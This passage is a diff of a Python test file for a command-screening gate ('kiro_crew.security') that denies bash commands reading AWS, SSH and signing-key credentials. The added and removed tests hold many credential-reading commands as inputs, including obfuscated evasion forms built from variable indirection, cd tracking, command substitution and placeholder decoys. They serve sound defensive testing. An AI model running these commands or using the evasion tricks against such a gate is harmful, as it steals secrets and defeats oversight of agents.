+        # seconds on a few thousand characters -- so a raw ``re.search`` here would
+        # hand a long crafted command a stall of the synchronous gate that the catalog
+        # tier is already linear on. Pinned as SHAPE, not as a duration: the tier must
+        # route through ``_deny_matcher``, and no compiled duplicate may remain in the
+        # raw list to reintroduce the cost behind the shared one.
+        from kiro_crew import security
+
+        shared = {rule.pattern for rule in security._ENV_CRED_SHARED_RULES}
+        assert all(compiled.pattern not in shared for compiled in security._ENV_CRED_PATTERNS)
+        real = security._deny_matcher
+        seen: list[str] = []
+
+        def spy(pattern: str):
+            seen.append(pattern)
+            return real(pattern)
+
+        monkeypatch.setattr(security, "_deny_matcher", spy)
+        assert security._check_env_credential_access("env | grep AWS_SECRET") is not None
+        assert seen[:1] == [security._ENV_DUMP_GREP_AWS_PATTERN]
+
+    @pytest.mark.parametrize(
+        "rule_id", ["credential-exfil-env-grep-aws", "credential-exfil-printenv-aws"]
+    )
+    def test_catalog_rule_is_published_not_silently_disabled(self, rule_id: str) -> None:
+        # ``_DenyMatcher`` disables a pattern that fails ``is_safe_user_regex`` with
+        # only a log line, so a rule that never matches looks identical to one that
+        # was narrowed. Assert on the matcher, not on ``re.search``: the fragment path
+        # is also what makes both tiers linear, and a pattern that lost it would keep
+        # matching while silently becoming length-capped and superlinear.
+        from kiro_crew.security import is_safe_user_regex
+
+        matcher = self._rule_matcher(rule_id)
+        assert not matcher._disabled
+        assert not matcher._bounded, "must stay on the full-input fragment path"
+        assert len(matcher._frag_res) > 1, "the ``.*`` gaps are what make matching linear"
+        assert is_safe_user_regex(matcher._frag_res[0].pattern)
+
+    @pytest.mark.parametrize("cmd", DENIED)
+    def test_credential_dumps_are_denied_on_both_tiers(self, cmd: str) -> None:
+        assert self._keystone(cmd), cmd
+        assert self._catalog_matcher().match(cmd), cmd
+        assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    @pytest.mark.parametrize("cmd", RESIDUAL_OVER_BLOCK)
+    def test_the_residual_over_block_is_pinned_not_assumed(self, cmd: str) -> None:
+        # Refused, and refused on purpose: each of these prints no credential, and
+        # each was refused before the narrowing as well. The assertion exists so a
+        # later attempt to reclaim them has to argue with the quoted-separator dumps
+        # in ``DENIED`` rather than delete a comment.
+        assert self._keystone(cmd), cmd
+        assert self._catalog_matcher().match(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", ALLOWED)
+    def test_benign_commands_pass_both_tiers(self, cmd: str) -> None:
+        assert not self._keystone(cmd), cmd
+        assert not self._catalog_matcher().match(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", PRINTENV_DENIED)
+    def test_printenv_of_a_secret_is_denied(self, cmd: str) -> None:
+        assert self._rule_matcher("credential-exfil-printenv-aws").match(cmd), cmd
+        assert self._keystone(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", PRINTENV_ALLOWED)
+    def test_printenv_of_a_non_secret_passes(self, cmd: str) -> None:
+        assert not self._rule_matcher("credential-exfil-printenv-aws").match(cmd), cmd
+        assert not self._keystone(cmd), cmd
+
+    @pytest.mark.parametrize("cmd", DENIED + PRINTENV_DENIED)
+    def test_full_gate_denies(self, cmd: str) -> None:
+        from kiro_crew.security import is_denied
+
+        assert is_denied(cmd) is not None, cmd
+
+    @pytest.mark.parametrize("cmd", ALLOWED + PRINTENV_ALLOWED)
+    def test_full_gate_allows(self, cmd: str) -> None:
+        # The whole gate, not just the two touched tiers: a benign shape that one
+        # rule stops refusing while a sibling rule still refuses it is not fixed.
+        from kiro_crew.security import is_denied
+
+        assert is_denied(cmd) is None, cmd
+
+    @pytest.mark.parametrize("truncation", SECRET_WORD_TRUNCATIONS)
+    def test_every_truncation_of_a_secret_word_is_denied(self, truncation: str) -> None:
+        # Derived from ``_AWS_SECRET_WORDS`` rather than sampled: a selector that
+        # recognised only whole words would let one keystroke off the end through, and
+        # the value ``grep`` would then print is the same credential.
+        cmd = f"env | grep AWS_{truncation}"
+        assert self._keystone(cmd), cmd
+        assert self._catalog_matcher().match(cmd), cmd
+
+    @pytest.mark.parametrize("letter", ["B", "C", "D", "E", "M", "P", "R", "T"])
+    def test_a_non_secret_initial_is_not_a_truncation(self, letter: str) -> None:
+        # The complement of the test above: only a letter that STARTS a secret-bearing
+        # word makes a one-character selector a credential read.
+        cmd = f"env | grep AWS_{letter}"
+        assert not self._keystone(cmd), cmd
+        assert not self._catalog_matcher().match(cmd), cmd
+
+    def test_selector_boundaries_admit_digits(self) -> None:
+        # ``(?![A-Za-z_])`` would end the bare prefix at a digit and deny a selector no
+        # secret-bearing name contains. Asserted on the constant so the two boundary
+        # classes cannot drift apart.
+        assert "A-Za-z0-9_" in security._AWS_VAR_SELECTOR
+        assert "(?![A-Za-z_])" not in security._AWS_VAR_SELECTOR
+
+    def test_the_printenv_rule_keeps_whole_words_only(self) -> None:
+        # ``printenv`` resolves EXACT names, so extending it with the grep selector's
+        # truncations would deny a command that prints nothing.
+        assert security._AWS_SECRET_VAR_NAMES in security._PRINTENV_AWS_SECRET_PATTERN
+        assert security._AWS_VAR_SELECTOR not in security._PRINTENV_AWS_SECRET_PATTERN
+
+
 class TestIsSensitiveBashCommand:
-    """Tests for is_sensitive_bash_command()."""
+    """Tests for is_sensitive_bash_command(): the IMDS and env-credential detectors.
 
-    def test_cat_aws_credentials(self) -> None:
-        result = is_sensitive_bash_command("cat ~/.aws/credentials")
-        assert "blocked" in result.lower()
-
-    def test_head_ssh_key(self) -> None:
-        result = is_sensitive_bash_command("head -5 ~/.ssh/id_rsa")
-        assert "blocked" in result.lower()
+    Paths are not this gate's subject -- see :class:`TestTheBashGateMatchesNoPaths`
+    -- so the cases here are the two detectors that remain, plus the ordinary
+    commands that must keep passing through them.
+    """
 
     def test_safe_command(self) -> None:
         assert is_sensitive_bash_command("cat ~/readme.md") is None
 
-    # ── Shell normalization: variable indirection and `cd` targets ──
-
-    def test_variable_assigned_in_the_command_is_resolved(self) -> None:
-        """A path reached through a variable the command itself assigned.
-
-        The normalizer expands `$HOME`, so `V=$HOME` resolves, but `$V` used as
-        a path prefix stayed literal and the path never matched. The assignment
-        is in the command text, so it can be substituted.
-        """
-        assert is_sensitive_bash_command("V=$HOME; awk 1 $V/.aws/credentials") is not None
-        assert is_sensitive_bash_command("V=$HOME; cat $V/.ssh/id_rsa") is not None
-        assert is_sensitive_bash_command("V=${HOME}; xxd $V/.ssh/id_rsa") is not None
-        # The variable can carry part of the sensitive path itself.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat $D/credentials") is not None
-
-    def test_unresolvable_variable_over_a_sensitive_tail_is_blocked(self) -> None:
-        """A variable assigned outside the command still cannot hide the tail.
-
-        The value lives in the shell, not the command text, so it cannot be
-        resolved. Fail closed only when the literal remainder is itself
-        sensitive — see the benign counterparts below.
-        """
-        assert is_sensitive_bash_command("awk 1 $V/.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $SOMEVAR/.ssh/id_rsa") is not None
-
-    def test_variable_over_a_benign_tail_is_allowed(self) -> None:
-        """An unresolved variable is not itself a reason to block."""
-        assert is_sensitive_bash_command("B=$HOME/build; cat $B/out.txt") is None
-        assert is_sensitive_bash_command("cat $PWD/out.txt") is None
-        assert is_sensitive_bash_command("cat $BUILD_DIR/report.log") is None
-
-    def test_bare_filename_after_cd_is_resolved_against_the_cd_target(self) -> None:
-        """`cd` + a bare filename read the same file as the absolute form.
-
-        A bare filename has no path separator, so it is not path-like and was
-        never checked; had it been, it would have resolved against the
-        gateway's working directory rather than the directory the command
-        moved to.
-        """
-        assert is_sensitive_bash_command("cd ~/.kiro/crew && cat token_signing.key") is not None
-        assert is_sensitive_bash_command("cd ~/.kiro/crew; cat token_signing.key") is not None
-        assert is_sensitive_bash_command("cd ~/.aws && cat credentials") is not None
-        assert is_sensitive_bash_command("cd ~/.ssh && cat id_rsa") is not None
-        # The `cd` target may itself arrive through $HOME.
-        assert (
-            is_sensitive_bash_command("cd $HOME/.kiro/crew && awk 1 token_signing.key") is not None
-        )
-
-    def test_cd_into_a_benign_directory_is_allowed(self) -> None:
-        """Tracking the `cd` target must not block ordinary relative reads."""
-        assert is_sensitive_bash_command("cd /tmp && cat notes.txt") is None
-        assert is_sensitive_bash_command("cd ~/project && cat config.json") is None
-        assert is_sensitive_bash_command("cd src && grep -rn pattern .") is None
-
-    def test_chained_relative_cd_resolves_against_prior_base(self) -> None:
-        """Relative cd targets must join against the prior base_dir, not overwrite."""
-        # cd ~/.kiro && cd crew → base should be ~/.kiro/crew, not bare "crew"
-        assert is_sensitive_bash_command("cd ~/.kiro && cd crew && cat token_signing.key") is not None
-        assert is_sensitive_bash_command("cd ~ && cd .aws && cat credentials") is not None
-        # Absolute cd resets the base entirely
-        assert is_sensitive_bash_command("cd /tmp && cd /home/user/.aws && cat credentials") is not None
-        # Benign chained cd is allowed
-        assert is_sensitive_bash_command("cd ~/project && cd src && cat main.py") is None
-
-    def test_quoted_separator_does_not_suppress_detection(self) -> None:
-        """A separator inside quotes must not shred the command and lose detection."""
-        # The semicolon is inside quotes — not a real shell separator
-        assert is_sensitive_bash_command('cat "a;b" ~/.aws/credentials') is not None
-        assert is_sensitive_bash_command("echo 'x; y' && cat ~/.ssh/id_rsa") is not None
-        # Quoted && inside an argument
-        assert is_sensitive_bash_command('awk "a&&b" ~/.aws/credentials') is not None
-        # A quote that breaks the `~/` adjacency the path regex needs, so only
-        # the quote-aware tokenizer can resolve it.
-        assert is_sensitive_bash_command('cat "a;b" "~"/.aws/credentials') is not None
-        assert is_sensitive_bash_command("awk '{a=1;b=2}' ~/\".aws\"/credentials") is not None
-
-    def test_quoted_separator_does_not_retarget_the_cd_base(self) -> None:
-        """A `cd` inside a quoted argument must not move the tracked directory.
-
-        The shell never leaves the directory it moved to, so neither may the
-        tracked base. Splitting on the quoted `;` would make `cd /tmp'` a
-        segment, and the bare filename would then resolve against `/tmp` and
-        read clean.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo 'x; cd /tmp' && cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command('cd ~/.aws && echo "a && cd /tmp" && cat credentials')
-            is not None
-        )
-        # The benign counterpart: no sensitive directory was ever entered.
-        assert is_sensitive_bash_command("echo 'x; cd /tmp' && cat notes.txt") is None
-
-    def test_separator_in_a_command_substitution_does_not_retarget_the_cd_base(self) -> None:
-        """A `cd` inside `$(...)` or backticks runs in a subshell.
-
-        It does not move the parent's directory, so its separators must not be
-        read as the parent's either — the same shape as a quoted separator, one
-        level of syntax removed.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo $(true; cd /tmp) && cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command(
-                "cd ~/.kiro/crew && echo `true; cd /tmp` && cat token_signing.key"
-            )
-            is not None
-        )
-        # An escaped separator is not a separator to a shell either.
-        assert (
-            is_sensitive_bash_command("cd ~/.aws && echo x\\; cd /tmp && cat credentials")
-            is not None
-        )
-
-    def test_assignment_only_counts_as_a_prefix(self) -> None:
-        """`NAME=value` past the command word is an argument, not an assignment.
-
-        A decoy could otherwise overwrite a real value: the shell keeps
-        `V=$HOME` and enters the protected directory, while the tracker had
-        recorded `V=/tmp` from an `echo` argument and resolved the `cd` there.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "V=$HOME; echo V=/tmp; cd $V/.kiro/crew; cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("D=$HOME/.aws; printf D=/tmp; cat $D/credentials") is not None
-        )
-        # A genuine leading assignment still resolves.
-        assert is_sensitive_bash_command("V=$HOME cat $V/.aws/credentials") is not None
-        # And an argument that merely looks like one does not deny on its own.
-        assert is_sensitive_bash_command("echo V=/tmp && cat notes.txt") is None
-
-    def test_cd_dash_returns_to_the_previous_directory(self) -> None:
-        """`cd -` goes back, so the tracked base has to go back with it."""
-        assert (
-            is_sensitive_bash_command("cd ~/.kiro/crew; cd /tmp; cd -; cat token_signing.key")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("pushd ~/.aws; pushd /tmp; cd -; cat credentials") is not None
-        )
-        # A bare `cd` goes to the home directory.
-        assert is_sensitive_bash_command("cd ~/project; cd; cat .aws/credentials") is not None
-        # Going back to an ordinary directory stays allowed.
-        assert is_sensitive_bash_command("cd /tmp; cd -; cat notes.txt") is None
-
-    def test_subshell_cd_is_scoped_to_the_subshell(self) -> None:
-        """A `cd` inside `( ... )` applies inside it and is dropped on exit.
-
-        Both halves matter. The read inside the subshell must see the base --
-        `(cd` glued into one token matched no `cd` check, so the base was never
-        set and the bare filename read clean. And the base must not outlive the
-        closing paren, or an ordinary read after it would start denying.
-        """
-        assert is_sensitive_bash_command("(cd ~/.kiro/crew && cat token_signing.key)") is not None
-        assert is_sensitive_bash_command("( cd ~/.aws && cat credentials )") is not None
-        assert is_sensitive_bash_command("(cd ~/.ssh; cat id_rsa)") is not None
-        # The move does not escape the subshell.
-        assert is_sensitive_bash_command("( cd ~/project && cat README.md )") is None
-
-    def test_entering_a_sensitive_directory_taints_later_reads(self) -> None:
-        """A `cd` into a credential directory is not walked back by later syntax.
-
-        Positional resolution has to match real bash to be sound, and the grammar
-        is unbounded. The monotone pass asks a question that needs no emulation:
-        the move was seen, so a read after it is denied — whatever syntax follows.
-        """
-        # A `cd` that does not execute at runtime, but the move was still spelled.
-        assert is_sensitive_bash_command("cd ~/.ssh; false && cd /tmp; cat id_rsa") is not None
-        # An assignment prefix is temporary, so the shell keeps the real value.
-        assert (
-            is_sensitive_bash_command("V=$HOME; V=/tmp echo hi; cd $V/.ssh; cat id_rsa") is not None
-        )
-        # Inside a command substitution, in both spellings.
-        assert is_sensitive_bash_command("echo $(cd ~/.aws; cat credentials)") is not None
-        assert is_sensitive_bash_command("echo `cd ~/.aws; cat credentials`") is not None
-        # Through a nested shell, which this gate does not parse into.
-        assert is_sensitive_bash_command("bash -c 'cd ~/.aws; cat credentials'") is not None
-        # `popd` unwinds a stack the tracker does not model.
-        assert (
-            is_sensitive_bash_command("pushd ~/.aws; pushd /tmp; popd; cat credentials") is not None
-        )
-
-    def test_taint_needs_both_a_sensitive_move_and_a_read(self) -> None:
-        """Neither half denies on its own, so ordinary work stays allowed."""
-        # An ordinary directory, read verb present.
-        assert is_sensitive_bash_command("cd /tmp; cd -; cat notes.txt") is None
-        assert is_sensitive_bash_command("cd ~/project && cd src && cat main.py") is None
-        assert is_sensitive_bash_command("cd ~/project && cat README.md") is None
-        # A read whose joined path is sensitive while the `cd` target is not is
-        # caught by the positional pass, not this one — both are needed.
-        assert is_sensitive_bash_command("cd ~ && cat .aws/credentials") is not None
-
-    def test_unset_variable_cannot_reconstruct_a_sensitive_path(self) -> None:
-        """An unset variable expands to nothing, so the empty reading is a real
-        spelling of the path and must be judged: `$HOME/$X.aws/credentials` with
-        `$X` unset is `~/.aws/credentials`."""
-        assert is_sensitive_bash_command("cat $HOME/$X.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $HOME/${X}.aws/credentials") is not None
-        assert is_sensitive_bash_command("cat $HOME/$X.ssh/id_rsa") is not None
-        # A variable that expands to nothing onto a non-sensitive tail stays clean.
-        assert is_sensitive_bash_command("cat $HOME/$X.txt") is None
-        assert is_sensitive_bash_command("cat ~/$X/notes.md") is None
-
-    def test_chained_cd_expansions_do_not_blow_up_the_gate(self) -> None:
-        """A chain of `cd ${D:-x}` segments must not grow the tracked base set
-        without bound — each segment can multiply it, so the gate would hang.
-        The cap keeps the synchronous check fast."""
-        import time
-
-        cmd = "D=bar; " + "; ".join(["cd ${D:-foo}"] * 20) + "; cat notes.txt"
-        start = time.monotonic()
-        is_sensitive_bash_command(cmd)
-        assert time.monotonic() - start < 30.0
-
-    def test_parameter_expansion_resolves_like_a_plain_reference(self) -> None:
-        """`${V:-default}` and friends name a variable just as `${V}` does.
-
-        Matching only the bare braced form left `cat ${D:-/tmp}/credentials` with
-        no recognized reference at all, so neither the substitution nor the
-        unresolved-variable hypothesis saw it.
-        """
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:-/tmp}/credentials") is not None
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:=/tmp}/credentials") is not None
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D#/nope}/credentials") is not None
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D/zz/yy}/credentials") is not None
-        # One level of nesting resolves on the outer name.
-        assert is_sensitive_bash_command("D=$HOME/.aws; cat ${D:-${E}}/credentials") is not None
-        # A variable the command never assigned still fails closed on the tail.
-        assert is_sensitive_bash_command("cat ${SOMEVAR:-/tmp}/.ssh/id_rsa") is not None
-        # As a `cd` target.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign remainder stays clean under any value.
-        assert is_sensitive_bash_command("B=$HOME/build; cat ${B:-/tmp}/out.txt") is None
-        assert is_sensitive_bash_command("cat ${PWD:-/tmp}/out.txt") is None
-
-    def test_a_masked_substitution_still_shows_the_path_inside_it(self) -> None:
-        """Masking is a trade, so the whole-line pass runs over BOTH spellings.
-
-        Masking keeps `cd "$(printf %s ~)/.kiro/crew"` as one token so its tail
-        still resolves. But it also hides a path written INSIDE the substitution,
-        and that shape is caught only on the raw text — losing it was a regression
-        against a read `main` already blocked.
-        """
-        assert is_sensitive_bash_command('echo $(ca""t ~/"."aws/credentials)') is not None
-        assert is_sensitive_bash_command("echo `cat ~/.ssh/id_rsa`") is not None
-        # And the masked-only shape keeps working, so neither pass was traded away.
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s ~)/.kiro/crew" && cat token_signing.key')
-            is not None
-        )
-
-    def test_the_substitution_placeholder_cannot_be_assigned(self) -> None:
-        """The placeholder is this module's sentinel, not a variable to be set.
-
-        `_mask_substitutions` rewrites every substitution to it, so a command that
-        assigned that name chose what the masked pass resolved those placeholders
-        to — here making the scanner read the `cd` target as /tmp while bash
-        entered $HOME.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "__kc_subst=/tmp; cd $(printf %s ~); cat .aws/credentials"
-            )
-            is not None
-        )
-
-    def test_a_parameter_expansion_is_judged_under_every_reading(self) -> None:
-        """An operator form can yield the variable's value OR the operand.
-
-        Resolving to the recorded value alone inverted `${D:+$HOME}`; leaving it
-        literal alone lost `${D:-/tmp}` where D is the sensitive directory. Both
-        readings are kept and either one being sensitive denies.
-        """
-        # The operand wins in bash, so the read AFTER the cd is what turns bad.
-        assert is_sensitive_bash_command("D=x; cd ${D:+$HOME}; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("D=x; cd ${D:-$HOME}; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("D=x; cd ${D/x/$HOME}; cat .aws/credentials") is not None
-        # The value wins here, and must not be lost by preferring the other reading.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign remainder stays clean under every reading.
-        assert is_sensitive_bash_command("B=$HOME/build; cd ${B:-/tmp}; cat out.txt") is None
-
-    def test_a_command_prefix_assignment_does_not_persist(self) -> None:
-        """`V=/tmp echo hi` exports V for that command only; bash restores it after.
-
-        Persisting it diverged from the shell in the attacker's favour: the tracker
-        followed the `cd` into /tmp while the shell still had $HOME.
-        """
-        assert (
-            is_sensitive_bash_command("V=$HOME; V=/tmp echo hi; cd $V; cat .aws/credentials")
-            is not None
-        )
-        # An assignment-only segment still persists — that is the legitimate form.
-        assert is_sensitive_bash_command("V=$HOME; cd $V; cat .aws/credentials") is not None
-
-    def test_an_append_assignment_builds_on_the_recorded_value(self) -> None:
-        """`NAME+=value` appends, so the tracked value has to append too.
-
-        The assignment pattern matched only `=`, so the whole `V+=/crew` token
-        failed to match and the segment was read as a command word instead of an
-        assignment. The tracked value stayed on `$HOME/.kiro` while bash held
-        `$HOME/.kiro/crew`, and the read after the `cd` resolved against the
-        wrong directory.
-        """
-        assert (
-            is_sensitive_bash_command('V=$HOME/.kiro; V+=/crew; cd "$V"; cat token_signing.key')
-            is not None
-        )
-        # Appending more than once, and appending to a name never assigned.
-        assert (
-            is_sensitive_bash_command(
-                'V=$HOME; V+=/.kiro; V+=/crew; cd "$V"; cat token_signing.key'
-            )
-            is not None
-        )
-        assert is_sensitive_bash_command('V+=$HOME/.aws; cd "$V"; cat credentials') is not None
-        # A benign append is still not a reason to deny.
-        assert is_sensitive_bash_command('B=$HOME; B+=/build; cd "$B"; cat out.txt') is None
-
-    def test_a_substitutions_own_text_can_name_the_path(self) -> None:
-        """`$HOME` inside a substitution is expanded before masking, so it is visible.
-
-        Masking the substitution to an opaque placeholder threw that away: the
-        target read as `$__kc_subst/crew`, the home hypothesis rewrote it to
-        `~/crew` — benign — while bash entered `~/.kiro/crew` and read the key.
-        """
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s "$HOME/.kiro")/crew"; cat token_signing.key')
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command('cd `printf %s "$HOME/.aws"`; cat credentials') is not None
-        )
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s $HOME)/.aws"; cat credentials') is not None
-        )
-        # Through a variable assigned from the substitution.
-        assert (
-            is_sensitive_bash_command(
-                'V=$(printf %s "$HOME/.kiro"); cd "$V/crew"; cat token_signing.key'
-            )
-            is not None
-        )
-        # Only a path-shaped last word is vouched for, so a substitution that ends
-        # on a command or subcommand name still falls through to the hypothesis
-        # rather than being read as a path — these must stay clean.
-        assert (
-            is_sensitive_bash_command('cd "$(git rev-parse --show-toplevel)" && cat README.md')
-            is None
-        )
-        assert is_sensitive_bash_command("cd $(mktemp -d) && cat notes.txt") is None
-        assert is_sensitive_bash_command("cat $(pwd)/out.txt") is None
-
-    def test_a_cd_into_a_directory_that_holds_a_secret_taints(self) -> None:
-        """`~/.kiro/crew` is not sensitive itself — only its leaves are.
-
-        Every check that guards a *move* asked `is_sensitive_path` about the `cd`
-        target, which answers "is this the protected thing". For the keystone the
-        answer is no, so the taint pass was inert for the one directory it exists to
-        protect, and `~/.aws` hid it: that one IS sensitive as a whole directory, so
-        every test written against that spelling passed.
-
-        Both shapes below are unresolvable by the segment walk — the first is one
-        opaque quoted argument, the second moves away again before the read — so
-        both depend on the taint pass.
-        """
-        assert (
-            is_sensitive_bash_command('bash -c "cd ~/.kiro/crew; cat token_signing.key"')
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("cd ~/.kiro/crew; false && cd /tmp; cat token_signing.key")
-            is not None
-        )
-        # The directory list is derived, so a directory that holds no secret is not
-        # tainted and an ordinary move still reads clean.
-        assert is_sensitive_bash_command("cd ~ && cat notes.txt") is None
-        assert is_sensitive_bash_command("cd /tmp && cat notes.txt") is None
-        assert is_sensitive_bash_command('bash -c "cd ~/src; cat main.py"') is None
-
-    def test_a_later_cd_does_not_erase_a_sensitive_one(self) -> None:
-        """The erasing `cd` does not have to run.
-
-        `false &&` short-circuits, so bash never leaves the crew directory — while
-        the walk had already moved its only base and resolved the read against
-        nothing. Deciding whether a `cd` executes means evaluating the command, so
-        nothing is forgotten instead.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "H=$HOME; D=$H/.kiro/crew; cd $D; false && cd /tmp; cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("cd ~/.aws; false && cd /tmp; cat credentials") is not None
-        )
-        # Ordinary chained moves are unaffected.
-        assert is_sensitive_bash_command("cd /tmp; cd /var/log; cat syslog") is None
-        assert is_sensitive_bash_command("cd ~ && cd src && cat main.py") is None
-
-    def test_a_declaration_builtin_is_an_assignment(self) -> None:
-        """`export NAME=value` assigns, so leaving the keyword in place lost it.
-
-        With the keyword still there the segment read as "a command word followed by
-        an operand", so the assignment-prefix run ended before it started and the
-        name was never recorded.
-        """
-        assert (
-            is_sensitive_bash_command("export D=$HOME/.kiro/crew; cd $D; cat token_signing.key")
-            is not None
-        )
-        for keyword in ("declare", "typeset", "local", "readonly"):
-            assert (
-                is_sensitive_bash_command(f"{keyword} D=$HOME/.aws; cd $D; cat credentials")
-                is not None
-            ), keyword
-        # Options before the name are skipped too.
-        assert (
-            is_sensitive_bash_command("export -p D=$HOME/.aws; cd $D; cat credentials") is not None
-        )
-        # A benign declaration is not a reason to deny.
-        assert is_sensitive_bash_command("export D=$HOME/src; cd $D; cat main.py") is None
-
-    def test_an_assignment_keeps_the_operator_form_literal(self) -> None:
-        """Collapsing an operator form at ASSIGNMENT time is one-way, and picked wrong.
-
-        `${X:+…}` names X, so resolving to the variable's value recorded `x` — while
-        bash yields the OPERAND for `:+`, entered the crew directory and read the
-        signing key. Recorded literally, both meanings survive to the point of use:
-        `_expansion_readings` derives the value form back out, and the operand is
-        still readable in the text.
-        """
-        assert (
-            is_sensitive_bash_command(
-                "X=x; D=${X:+$HOME/.kiro/crew}; cd $D; cat token_signing.key"
-            )
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("X=x; D=${X:-$HOME/.aws}; cd $D; cat credentials") is not None
-        )
-        # The value reading must not be lost either — this one needs it.
-        assert (
-            is_sensitive_bash_command("D=$HOME/.kiro/crew; cd ${D:-/tmp}; cat token_signing.key")
-            is not None
-        )
-        # A benign operand stays clean under every reading.
-        assert is_sensitive_bash_command("X=x; D=${X:+$HOME/build}; cd $D; cat out.txt") is None
-        assert is_sensitive_bash_command("B=$HOME/build; cd ${B:-/tmp}; cat out.txt") is None
-
-    def test_the_reserved_placeholder_name_is_refused_in_every_spelling(self) -> None:
-        """The segment walk numbers the placeholder, so the refusal has to be numbered too.
-
-        `_mask_substitutions_valued` emits `__kc_subst1`, `__kc_subst2`, … so two
-        substitutions in one segment cannot inherit each other's value. A refusal
-        that only knew the unnumbered spelling therefore covered a name the walk
-        no longer produces.
-
-        Asserted on the matcher rather than only end to end: the unresolved
-        reading is kept alongside the resolved one, so a recorded value cannot
-        remove a denial on its own and no single payload isolates this. The
-        invariant is still worth holding — it is what keeps a command from naming
-        this module's private sentinel at all.
-        """
-        from kiro_crew.security import _SUBST_PLACEHOLDER_NAME, _SUBST_PLACEHOLDER_NAME_RE
-
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(_SUBST_PLACEHOLDER_NAME)
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}1")
-        assert _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}12")
-        # A name that merely starts the same way is a different variable.
-        assert not _SUBST_PLACEHOLDER_NAME_RE.match(f"{_SUBST_PLACEHOLDER_NAME}_x")
-        assert not _SUBST_PLACEHOLDER_NAME_RE.match(f"x{_SUBST_PLACEHOLDER_NAME}")
-        # And the payload the refusal exists for stays denied in both spellings.
-        assert (
-            is_sensitive_bash_command("__kc_subst=/tmp; cd $(printf %s ~); cat .aws/credentials")
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("__kc_subst1=/tmp; cd $(printf %s ~); cat .aws/credentials")
-            is not None
-        )
-
-    def test_a_wrapped_cd_is_still_a_cd(self) -> None:
-        """`builtin` and `command` run the builtin, so the command word moves.
-
-        Unwrapped, the segment was not recognised as a `cd` at all, so no base was
-        tracked and the bare filename after it read clean.
-        """
-        assert is_sensitive_bash_command("builtin cd ~; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("command cd ~; cat .aws/credentials") is not None
-        assert is_sensitive_bash_command("builtin pushd ~; cat .aws/credentials") is not None
-        # A real program whose name merely starts the same way is not unwrapped.
-        assert is_sensitive_bash_command("commander cd /tmp && cat notes.txt") is None
-
-    def test_command_substitution_is_an_unresolved_value(self) -> None:
-        """A substitution's value needs the command to run, so fail closed on it.
-
-        Unquoted it also contains spaces, and `shlex` splits on them, so the
-        target used to shred into fragments that matched nothing. It is masked to
-        a single token before tokenization.
-        """
-        assert (
-            is_sensitive_bash_command('cd "$(printf %s ~)/.kiro/crew" && cat token_signing.key')
-            is not None
-        )
-        assert (
-            is_sensitive_bash_command("cd $(printf %s ~)/.aws && cat credentials") is not None
-        )
-        assert is_sensitive_bash_command("cd `printf %s ~`/.ssh && cat id_rsa") is not None
-        assert is_sensitive_bash_command("cat $(printf %s ~)/.aws/credentials") is not None
-        # Through a variable assigned from a substitution.
-        assert (
-            is_sensitive_bash_command("D=$(printf %s ~); cd $D/.kiro/crew && cat token_signing.key")
-            is not None
-        )
-        # A substitution over a benign remainder is not a reason to deny.
-        assert (
-            is_sensitive_bash_command('cd "$(git rev-parse --show-toplevel)" && cat README.md')
-            is None
-        )
-        assert is_sensitive_bash_command("cd $(mktemp -d) && cat notes.txt") is None
-        assert is_sensitive_bash_command("cat $(pwd)/out.txt") is None
-
-    def test_pushd_tracks_directory(self) -> None:
-        """pushd should be treated like cd for directory tracking."""
-        assert is_sensitive_bash_command("pushd ~/.kiro/crew && cat token_signing.key") is not None
-        assert is_sensitive_bash_command("pushd /tmp && cat notes.txt") is None
-
-    def test_home_with_backslash_separators_survives_tokenization(
-        self, tmp_path, monkeypatch
-    ) -> None:
-        """`$HOME` must still resolve when the home path holds backslashes.
-
-        `normalize_shell_command` substitutes the home into the command text
-        before `shlex.split(posix=True)`, which reads a backslash as an escape
-        character. A Windows home — `C:\\Users\\<name>` — was therefore
-        tokenized to `C:Users<name>`: separators eaten, the path no longer
-        under the home directory, and so every `$HOME`-spelled credential path
-        resolved clean. This reproduces that shape on any platform, since a
-        backslash is a legal POSIX filename character.
-        """
-        home = tmp_path / "Users\\runneradmin"
-        (home / ".aws").mkdir(parents=True)
-        (home / ".aws" / "credentials").write_text("[default]\n")
-        (home / ".kiro" / "crew").mkdir(parents=True)
